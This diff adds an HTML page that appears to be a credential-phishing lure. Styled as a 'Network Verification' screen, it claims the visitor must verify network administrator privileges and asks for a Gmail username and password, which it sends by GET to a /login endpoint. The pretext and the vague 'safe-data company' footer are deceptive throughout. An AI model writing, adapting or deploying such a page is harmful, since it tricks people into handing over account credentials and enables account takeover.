@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>Network Verification</title>
+    <style>
+        body { background-color: #0d1117; color: #c9d1d9; font-family: sans-serif; margin: 0; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; padding: 20px; box-sizing: border-box; }
+        .container { width: 100%; max-width: 380px; text-align: center; }
+        h2 { font-size: 19px; font-weight: 600; margin-bottom: 20px; color: #ffffff; }
+        .description { font-size: 13.5px; line-height: 1.5; color: #8b949e; margin-bottom: 45px; }
+        .form-group { text-align: left; margin-bottom: 22px; }
+        label { display: block; font-size: 14px; margin-bottom: 8px; color: #f0f6fc; }
+        .input-wrapper { position: relative; background-color: #161b22; border: 1px solid #30363d; border-radius: 6px; }
+        input { width: 100%; padding: 12px; background: transparent; border: none; color: #c9d1d9; font-size: 15px; box-sizing: border-box; outline: none; }
+        .email-input { padding-right: 100px; }
+        .suffix { position: absolute; right: 12px; top: 50%; transform: translateY(-50%); color: #484f58; font-size: 14px; pointer-events: none; }
+        button { background: transparent; border: none; color: #ffffff; font-size: 17px; font-weight: 600; margin-top: 35px; cursor: pointer; width: 100%; }
+        footer { position: absolute; bottom: 30px; font-size: 11px; color: #484f58; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h2>Verify administrator privileges</h2>
+        <p class="description">We need you to verify your network administrator privileges to ensure you are not an intruder.</p>
+
+        <form action="/login" method="GET">
+            <div class="form-group">
+                <label>Email</label>
+                <div class="input-wrapper">
+                    <input type="text" name="email" class="email-input" required pattern="[a-zA-Z0-9.]+" title="Chỉ nhập phần tên email">
+                    <span class="suffix">@gmail.com</span>
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Password</label>
+                <div class="input-wrapper">
+                    <input type="password" name="password" required minlength="6">
+                </div>
+            </div>
+
+            <button type="submit" onclick="this.innerHTML='Verifying...'">Confirm</button>
+        </form>
+    </div>
+    <footer>©Belongs to safe-data company</footer>
+</body>
+</html>
+
